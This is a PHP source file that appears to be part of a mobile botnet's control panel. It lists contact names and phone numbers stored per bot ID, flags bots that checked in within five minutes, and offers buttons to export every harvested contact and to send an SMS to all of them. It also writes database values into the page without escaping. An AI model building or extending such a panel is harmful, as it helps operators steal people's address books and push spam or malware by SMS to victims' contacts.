<?php
	include "config.php";
	
	
	
	print_header();
	
	print_menu();
	
	if(strlen($_GET['op'])>0){
		$html.= "<a href=contacts.php>[back]</a><hr>";
	}
	
	if($_GET['op']=="showform"){
			if($_GET['query']=="sendsmstoall"){
				$html .= "
					<form action=\"ajax.php\" method=\"POST\">
						<input type=hidden name=op value=\"sendsmstoallcontacts\" />
						<input type=hidden name=bid value=\"".$bid."\" />
						<div class=\"form-group\">
							<label for=\"exampleFormControlTextarea1\">sms text</label>
							<textarea class=\"form-control\" id=\"exampleFormControlTextarea1\" rows=\"5\" name=\"text\"></textarea>
						  </div>
						<button type=\"submit\" class=\"btn btn-primary mb-2\">send sms to all contacts</button>
					</form>
				";
			}
	}
	
	if($_GET['op']==""){
		
		$html .= "<script>
						
						function copy(data){
							var inp =document.createElement('input');
							document.body.appendChild(inp);
							inp.value =data;
							inp.select();
							document.execCommand('copy',false);
							inp.remove();
						}
						</script>";
		
		$html .= "
		
		 <div class=\"row\">
		  <div class=\"col-sm-6\">
			<button type=\"button\" class=\"btn btn-primary\" onclick=\"location.href='contacts.php?op=showform&query=sendsmstoall';\">Send SMS To ALL</button>
			<button type=\"button\" class=\"btn btn-primary\" onclick=\"location.href='raw.php?id=".$bid."&query=allcontacts';\">Export all contacts</button>
		  </div>
		  <div class=\"col-sm-6\">
				 <form>
				  <div class=\"input-group\">
					<input type=\"text\" class=\"form-control\" placeholder=\"Search\">
					<div class=\"input-group-btn\">
					  <button class=\"btn btn-default\" type=\"submit\">
						<i class=\"glyphicon glyphicon-search\"></i>
					  </button>
					</div>
				  </div>
				</form> 

			</div>
		</div> 
		<br>	
		<table class=\"table\">
		<thead>
		  <tr>
			<th>BID</th>
			<th>Name</th>
			<th>Phone</th>
			<th>Friends</th>
		  </tr>
		</thead>
		<tbody>";
		  
		$res = $dbm->query("select * from contacts ORDER by id DESC");
		if($dbm->count>0){
			while($row=mysqli_fetch_array($res)) {
				if(my_bot($row[1])){
					//$return[] = $row;
					$html.= " ";
					if((time()-$row[5])<300){
						$html.= "<tr class=\"success\">";
					}else{
						$html.= "<tr>";
					}
					$html.= "
						<th>".get_link_bot($row[1])."</th>
						<th>".$row[2]."</th>
						<th>".$row[3]."</th>
						<th></th>
					</tr>
					";			
				}
			}
		}
		  
		$html.="</tbody>
	  </table>
		";

	}

	print_content("All contacts",$html);
	
	print_footer();

?>
